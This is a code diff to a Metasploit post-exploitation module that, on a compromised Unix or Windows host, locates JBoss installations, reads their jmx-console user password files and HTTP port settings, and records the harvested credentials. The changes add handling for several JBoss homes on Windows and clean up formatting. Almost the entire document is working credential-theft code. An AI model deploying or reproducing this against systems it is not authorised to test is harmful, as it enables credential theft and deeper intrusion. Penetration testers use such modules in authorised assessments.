@@ -34,7 +34,7 @@ class MetasploitModule < Msf::Post
             credential_core = create_credential(credential_data)
 
             if not port.is_a? Integer
-                print_status("Port not an Integer, Something probably went wrong")
+                print_status("Failed to detect port, defaulting to 8080 for creds database")
                 port = 8080
             end
 
@@ -141,107 +141,120 @@ class MetasploitModule < Msf::Post
     def gathernix()
         print_status("Unix OS detected, attempting to locate Jboss services")
         version = getversion(cmd_exec('locate jar-versions.xml').split("\n"))
-          home = readhome(cmd_exec('printenv').split("\n"))
-          pwfiles = getpwfiles(cmd_exec('locate jmx-console-users.properties').split("\n"),home)
-          listenports = getports()
-          getpw(pwfiles,listenports)
+        home = readhome(cmd_exec('printenv').split("\n"))
+        pwfiles = getpwfiles(cmd_exec('locate jmx-console-users.properties').split("\n"),home)
+        listenports = getports()
+        getpw(pwfiles,listenports)
     end
 
     def winhome()
+        home = Array.new
         exec = cmd_exec('WMIC PROCESS get Caption,Commandline').split("\n")
            exec.each do |line|
-               if line.downcase.include? "java.exe" and line.downcase.include? "jboss"
-                   print_status("Jboss process found")
-                   home = line.split('-classpath "')[1].split("\\bin\\")[0]
-                   return home
-               end
-           end
-       end
-
-       def wingetinstances(home)
-           instances = Array.new
-           instance_location = home + "\\server"
-           exec = cmd_exec('cmd /c dir ' + instance_location).split("\n")
-           exec.each do |instance|
-               if instance.split("<DIR>")[1]
-                   if (not instance.split("<DIR>")[1].strip().include? ".") and (not instance.split("<DIR>")[1].strip().include? "..")
-                       instance_path = home + "\\server\\" + (instance.split("<DIR>")[1].strip())
-                       instances.push(instance_path)
-                   end
-               end
-           end
-           return instances
-       end
-
-       def winpwfiles(instances)
-           files = Array.new
-           instances.each do |seed|
-               file_path = seed + "\\conf\\props\\jmx-console-users.properties"
-               if exist?(file_path)
-                   files.push(file_path)
-               end
-           end
-           return files
-       end
-
-       def wingetport(instances)
-           port = Array.new
-
-        instances.each do |seed|
-            path1 = seed + "\\conf\\bindingservice.beans\\META-INF\\bindings-jboss-beans.xml"
-            path2 = seed + "\\deploy\\jboss-web.deployer\\server.xml"
-
-            if exist?(path1)
-                file1 = read_file(seed + "\\conf\\bindingservice.beans\\META-INF\\bindings-jboss-beans.xml").split("\n")
-            end
-
-            if exist?(path2)
-                file2 = read_file(seed + "\\deploy\\jboss-web.deployer\\server.xml")
-            end
-
-            if file1
-                print_status("Bind file found: " + seed + "\\conf\\bindingservice.beans\\META-INF\\bindings-jboss-beans.xml")
-                parse = false
-                nextport = false
-                file1.each do |line|
-                    if line.strip() == '<bean class="org.jboss.services.binding.ServiceBindingMetadata">'
-                        parse = true
-                    elsif line.strip() == '</bean>'
-                        parse = false
-                    elsif parse and line.include? "HttpConnector"
-                        nextport = true
-                    elsif parse and nextport
-                        port.push(line.split('<property name="port">')[1].split('<')[0].to_i)
-                        nextport = false
+                if line.downcase.include? "java.exe" and line.downcase.include? "jboss"
+                    print_status("Jboss service found")
+                    parse = line.split('-classpath "')[1].split("\\bin\\")[0]
+                    if parse[0] == ';'
+                        home.push(parse.split(';')[1])
+                    else
+                        home.push(parse)
                     end
                 end
-            end
+           end
+        return home
+    end
 
-            if file2
-                print_status("Bind file found: " + seed + "\\deploy\\jboss-web.deployer\\server.xml")
-                xml2  = Nokogiri::XML(file2)
-                xml2.xpath("//Server//Connector").each do |connector|
-                    if connector['protocol'].include? "HTTP"
-                        print_status(connector['port'])
-                        port.push(connector['port'].to_i)
-                        break
-                    end
+    def wingetinstances(home)
+       instances = Array.new
+       instance_location = home + "\\server"
+       exec = cmd_exec('cmd /c dir ' + instance_location).split("\n")
+       exec.each do |instance|
+           if instance.split("<DIR>")[1]
+               if (not instance.split("<DIR>")[1].strip().include? ".") and (not instance.split("<DIR>")[1].strip().include? "..")
+                   instance_path = home + "\\server\\" + (instance.split("<DIR>")[1].strip())
+                   instances.push(instance_path)
+               end
+           end
+       end
+       return instances
+    end
+
+    def winpwfiles(instances)
+       files = Array.new
+       instances.each do |seed|
+           file_path = seed + "\\conf\\props\\jmx-console-users.properties"
+           if exist?(file_path)
+               files.push(file_path)
+           end
+       end
+       return files
+    end
+
+    def wingetport(instances)
+       port = Array.new
+
+    instances.each do |seed|
+        path1 = seed + "\\conf\\bindingservice.beans\\META-INF\\bindings-jboss-beans.xml"
+        path2 = seed + "\\deploy\\jboss-web.deployer\\server.xml"
+
+        if exist?(path1)
+            file1 = read_file(seed + "\\conf\\bindingservice.beans\\META-INF\\bindings-jboss-beans.xml").split("\n")
+        end
+
+        if exist?(path2)
+            file2 = read_file(seed + "\\deploy\\jboss-web.deployer\\server.xml")
+        end
+
+        if file1
+            print_status("Bind file found: " + seed + "\\conf\\bindingservice.beans\\META-INF\\bindings-jboss-beans.xml")
+            parse = false
+            nextport = false
+            file1.each do |line|
+                if line.strip() == '<bean class="org.jboss.services.binding.ServiceBindingMetadata">'
+                    parse = true
+                elsif line.strip() == '</bean>'
+                    parse = false
+                elsif parse and line.include? "HttpConnector"
+                    nextport = true
+                elsif parse and nextport
+                    port.push(line.split('<property name="port">')[1].split('<')[0].to_i)
+                    nextport = false
+                    print_status(line.split('<property name="port">')[1].split('<')[0])
                 end
             end
         end
-        return port
-       end
+
+        if file2
+            print_status("Bind file found: " + seed + "\\deploy\\jboss-web.deployer\\server.xml")
+            xml2  = Nokogiri::XML(file2)
+            xml2.xpath("//Server//Connector").each do |connector|
+                if connector['protocol'].include? "HTTP"
+                    print_status(connector['port'])
+                    port.push(connector['port'].to_i)
+                    break
+                end
+            end
+        end
+    end
+    return port
+    end
 
     def gatherwin()
         print_status("Windows OS detected, enumerating services")
-        home = winhome()
-        version_file = Array.new
-        version_file.push(home + "\\jar-versions.xml")
-        version = getversion(version_file)
-        instances = wingetinstances(home)
-        pwfiles = winpwfiles(instances)
-        listenports = wingetport(instances)
-        getpw(pwfiles,listenports)
+        homeArray = winhome()
+        if homeArray.size > 0
+            homeArray.each do |home|
+                version_file = Array.new
+                version_file.push(home + "\\jar-versions.xml")
+                version = getversion(version_file)
+                instances = wingetinstances(home)
+                pwfiles = winpwfiles(instances)
+                listenports = wingetport(instances)
+                getpw(pwfiles,listenports)
+            end
+        else
+            print_status("No Jboss service has been found")
+        end
     end
 
     def run
@@ -251,5 +264,4 @@ class MetasploitModule < Msf::Post
           gathernix()
         end
     end
-
 end
